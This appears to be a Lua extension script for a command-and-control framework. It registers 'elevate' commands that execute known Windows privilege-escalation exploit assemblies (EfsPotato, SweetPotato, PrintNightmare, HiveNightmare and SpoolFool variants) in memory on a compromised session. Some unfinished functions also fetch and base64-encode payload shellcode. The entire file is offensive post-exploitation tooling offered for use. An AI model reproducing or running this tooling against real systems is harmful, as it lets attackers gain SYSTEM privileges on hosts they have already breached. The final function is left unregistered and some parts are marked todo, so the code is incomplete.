local time = require("time")
local strings = require("strings")
local root_command = "elevate"

local function new_sac()
    local sac = new_sacrifice(0,false,false,false,"")
end
local function command_register(command_name, command_function, help_string, ttp)
    command(root_command .. ":" .. command_name, command_function, help_string, ttp)
end

-- start EfsPotato_Net3.5.exe
local function EfsPotato_Net35_Command(args)
    if #args < 1 then
        error("Usage: EfsPotato_Net3.5 <cmd>")
    end
    local session = active()
    local efspotato_path = "Elevate/EfsPotato_Net3.5.exe"
    return execute_assembly(session, script_resource(efspotato_path), args, true, false, false)
end
command_register("EfsPotato_Net3.5_Command", EfsPotato_Net35_Command, "Usage: EfsPotato_Net3.5_Command <cmd>", "")
-- end EfsPotato_Net3.5.exe

-- start EfsPotato_Net3.5_CS.exe todo
local function EfsPotato_Net35_Shellcode(args)
    local session = active()
    local efspotato_path = "Elevate/EfsPotato_Net3.5_CS.exe"
    local shellcode = payload_local() -- todo
    local b64_shellcode = base64_encode(shellcode)
    return execute_assembly(session, script_resource(efspotato_path), args, true, false, false)
end
command_register("EfsPotato_Net3.5_Shellcode", EfsPotato_Net35_Shellcode, "Usage: elevate EfsPotato_Net35_Shellcode", "")
-- end EfsPotato_Net3.5_CS.exe

-- start EfsPotato_Net4.exe
local function EfsPotato_Net40_Command(args)
    if #args ~= 1 then
        error("Usage: EfsPotato_Net4.0 <cmd>")
    end
    local session = active()
    local efspotato_path = "Elevate/EfsPotato_Net4.0.exe"
    return execute_assembly(session, script_resource(efspotato_path), args, true, false, false)
end
command_register("EfsPotato_Net4.0_Command", EfsPotato_Net40_Command, "Usage: elevate EfsPotato_Net4.0_Command <cmd>", "")
-- end EfsPotato_Net4.exe

-- SharpHiveNightmare_Net4.exe
local function SharpHiveNightmare_Net40()
    local session = active()
    local sharphivenightmare_path = "Elevate/SharpHiveNightmare_Net4.0.exe"
    return execute_assembly(session, script_resource(sharphivenightmare_path), {  }, true, false, false)
end
command_register("SharpHiveNightmare_Net4.0", SharpHiveNightmare_Net40, "SharpHiveNightmare_Net40", "")
-- end SharpHiveNightmare_Net4.exe

-- SharpHiveNightmare_Net4.5.exe
local function SharpHiveNightmare_Net45()
    local session = active()
    local sharphivenightmare_path = "Elevate/SharpHiveNightmare_Net4.5.exe"
    return execute_assembly(session, script_resource(sharphivenightmare_path), {  }, true, false, false)
end
command_register("SharpHiveNightmare_Net4.5", SharpHiveNightmare_Net45, "SharpHiveNightmare_Net45", "")
-- end SharpHiveNightmare_Net4.5.exe

-- SharpPrintNightmare_Net4.5.exe
local function SharpPrintNightmare_Net45(args)
    local session = active()
    local sharpprintnightmare_path = "Elevate/SharpPrintNightmare_Net4.5.exe"
    return execute_assembly(session, script_resource(sharpprintnightmare_path), args, true, false, false)
end
command_register("SharpPrintNightmare_Net4.5", SharpPrintNightmare_Net45, "SharpPrintNightmare_Net45", "")
-- end SharpPrintNightmare_Net4.5.exe

-- SharpPrintNightmare_Net4.exe
local function SharpPrintNightmare_Net40(args)
    local session = active()
    local sharpprintnightmare_path = "Elevate/SharpPrintNightmare_Net4.0.exe"
    return execute_assembly(session, script_resource(sharpprintnightmare_path), args, true, false, false)
end
command_register("SharpPrintNightmare_Net4.0", SharpPrintNightmare_Net40, "SharpPrintNightmare_Net40", "")
-- end SharpPrintNightmare_Net4.exe

-- SpoolFool_Net4.exe
local function SpoolFool_Net40(args)
    local session = active()
    local spoolfool_path = "Elevate/SpoolFool_Net4.0.exe"
    return execute_assembly(session, script_resource(spoolfool_path), args, true, false, false)
end
command_register("SpoolFool_Net4.0", SpoolFool_Net40, "SpoolFool_Net40", "")
-- end SpoolFool_Net4.exe

-- SweetPotato4-46.exe
local function SweetPotato4_46(args)
    if #args ~= 2 then
        error("args required")
    end
    local session = active()
    local sweetpotato_path = "Elevate/SweetPotato4-46.exe"
    return execute_assembly(session, script_resource(sweetpotato_path), args, true, false, false)
end
command_register("SweetPotato4-46", SweetPotato4_46, "SweetPotato4-46", "")
-- end SweetPotato4-46.exe

-- SweetPotato_CS.exe todo
local function SweetPotato_CS(args)
    local session = active()
    local sweetpotato_path = "Elevate/SweetPotato_CS.exe"
    local shellcode = payload_local() -- todo
    local b64_shellcode = base64_encode(shellcode)
    return execute_assembly(session, script_resource(sweetpotato_path), args, true, false, false)
end
